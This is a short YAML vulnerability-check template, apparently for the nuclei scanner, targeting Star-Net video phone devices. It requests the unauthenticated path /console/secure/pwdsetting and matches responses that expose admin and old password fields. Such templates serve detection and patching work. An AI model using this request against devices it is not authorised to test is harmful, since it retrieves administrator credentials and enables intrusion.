id: poc-yaml-star-net-console-pwdsetting
info:
  name: "星网锐捷 视频话机设备pwdsetting 管理密码信息泄漏"
  author: ProjectDiscoveryAI
  severity: high
  tags: 星网锐捷
http:
  - method: GET
    path:
      - "/console/secure/pwdsetting"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"cOldPasswd\""
          - "\"adminPasswd\""
          - "\"webport\""
        part: body
